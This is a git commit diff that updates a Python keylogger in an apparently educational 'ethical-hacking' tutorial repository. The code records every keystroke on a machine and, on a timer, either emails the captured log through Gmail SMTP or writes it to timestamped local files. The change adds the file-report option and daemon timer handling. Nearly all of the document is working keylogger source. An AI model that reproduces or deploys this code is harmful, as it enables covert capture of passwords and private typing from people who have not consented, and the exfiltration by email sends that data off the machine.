4c2a0e86495ec9d348598f7a19d5bea7a685aa76
x4nth055 <fullclip@protonmail.com>
2020-12-18 18:14:51 +0100

    update keylogger tutorial

--- ethical-hacking/keylogger/keylogger.py
+++ ethical-hacking/keylogger/keylogger.py
@@ -1,22 +1,24 @@
 import keyboard # for keylogs
 import smtplib # for sending email using SMTP protocol (gmail)
-# Semaphore is for blocking the current thread
 # Timer is to make a method runs after an `interval` amount of time
-from threading import Semaphore, Timer
+from threading import Timer
+from datetime import datetime
 
-SEND_REPORT_EVERY = 600 # 10 minutes
+SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
 EMAIL_ADDRESS = "put_real_address_here@gmail.com"
 EMAIL_PASSWORD = "put_real_pw"
 
 class Keylogger:
-    def __init__(self, interval):
+    def __init__(self, interval, report_method="email"):
         # we gonna pass SEND_REPORT_EVERY to interval
         self.interval = interval
+        self.report_method = report_method
         # this is the string variable that contains the log of all 
         # the keystrokes within `self.interval`
         self.log = ""
-        # for blocking after setting the on_release listener
-        self.semaphore = Semaphore(0)
+        # record start & end datetimes
+        self.start_dt = datetime.now()
+        self.end_dt = datetime.now()
 
     def callback(self, event):
         """
@@ -39,9 +41,24 @@ class Keylogger:
                 # replace spaces with underscores
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
-
+        # finally, add the key name to our global `self.log` variable
         self.log += name
     
+    def update_filename(self):
+        # construct the filename to be identified by start & end datetimes
+        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+
+    def report_to_file(self):
+        """This method creates a log file in the current directory that contains
+        the current keylogs in the `self.log` variable"""
+        # open the file in write mode (create it)
+        with open(f"{self.filename}.txt", "w") as f:
+            # write the keylogs to the file
+            print(self.log, file=f)
+        print(f"[+] Saved {self.filename}.txt")
+
     def sendmail(self, email, password, message):
         # manages a connection to an SMTP server
         server = smtplib.SMTP(host="smtp.gmail.com", port=587)
@@ -61,24 +78,38 @@ class Keylogger:
         """
         if self.log:
             # if there is something in log, report it
-            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
-            # can print to a file, whatever you want
-            # print(self.log)
+            self.end_dt = datetime.now()
+            # update `self.filename`
+            self.update_filename()
+            if self.report_method == "email":
+                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+            elif self.report_method == "file":
+                self.report_to_file()
+            # if you want to print in the console, uncomment below line
+            # print(f"[{self.filename}] - {self.log}")
+            self.start_dt = datetime.now()
         self.log = ""
-        Timer(interval=self.interval, function=self.report).start()
+        timer = Timer(interval=self.interval, function=self.report)
+        # set the thread as daemon (dies when main thread die)
+        timer.daemon = True
+        # start the timer
+        timer.start()
 
     def start(self):
+        # record the start datetime
+        self.start_dt = datetime.now()
         # start the keylogger
         keyboard.on_release(callback=self.callback)
         # start reporting the keylogs
         self.report()
-        # block the current thread,
-        # since on_release() doesn't block the current thread
-        # if we don't block it, when we execute the program, nothing will happen
-        # that is because on_release() will start the listener in a separate thread
-        self.semaphore.acquire()
+        # block the current thread, wait until CTRL+C is pressed
+        keyboard.wait()
 
     
 if __name__ == "__main__":
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
+    # if you want a keylogger to send to your email
+    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
+    # if you want a keylogger to record keylogs to a local file 
+    # (and then send it using your favorite method)
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
     keylogger.start()
